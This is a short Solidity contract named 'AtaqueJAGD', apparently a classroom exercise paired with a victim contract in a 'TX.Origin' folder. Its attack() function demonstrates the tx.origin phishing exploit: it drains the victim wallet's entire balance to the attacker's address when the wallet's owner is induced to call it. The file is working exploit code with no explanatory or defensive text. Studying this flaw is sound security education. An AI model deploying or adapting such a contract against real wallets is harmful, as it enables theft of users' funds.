// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "contracts/TX.Origin/VictimaJAGD.sol";

contract AtaqueJAGD {
    address payable public owner;
    VictimaJAGD wallet;

    constructor(VictimaJAGD _wallet) {
        wallet = _wallet;
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
